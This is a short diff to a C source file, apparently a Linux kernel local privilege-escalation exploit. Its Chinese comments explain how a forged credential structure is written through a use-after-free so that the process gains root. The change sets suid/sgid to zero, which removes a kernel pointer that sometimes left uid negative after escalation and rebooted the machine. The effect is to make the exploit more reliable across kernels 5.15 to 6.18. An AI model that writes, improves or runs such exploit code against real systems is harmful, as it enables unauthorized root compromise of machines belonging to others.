@@ -1188,10 +1188,19 @@ static int build_stream_pattern(unsigned char *pat, unsigned node_off,
 		}
 		cred = (uint64_t *)(pat + node_off);
 		if (CRED_UID_OFF >= 8) {
-			/* 6.6/6.12/6.18: usage 占 8 字节，uid@8，直接写这三个槽位 */
+			/* 6.6/6.12/6.18: usage 占 8 字节，uid@8，直接写这两个槽位 */
 			cred[0] = node_kva;                     /* usage（非 0 防止提前释放） */
 			cred[1] = 0;                            /* uid / gid */
-			cred[2] = g_task + TASK_CRED;           /* suid / sgid（历史行为，保留） */
+			/*
+			 * suid / sgid 也必须为 0（正规 root cred 的全部 uid* 都是 0）。
+			 * 历史实现把这里写成内核指针 g_task+TASK_CRED，指望后续
+			 * one_uaf(g_cred_kva+16) 定向补零覆盖掉它；但 ask_child 只校验
+			 * uid/euid，不校验 suid，一旦那两次补零 miss（最多重试 3 次且不
+			 * 判成败），suid/sgid 就残留成一个内核地址——按有符号读即负数，
+			 * 正是「偶尔提权后 uid 为负并导致重启」的根因。直接摆 0，补零
+			 * 只作冗余保险。
+			 */
+			cred[2] = 0;                            /* suid / sgid */
 		} else {
 			/*
 			 * 5.15/6.1: usage 只有 4 字节、uid@4；写 8 字节会把 uid 打成
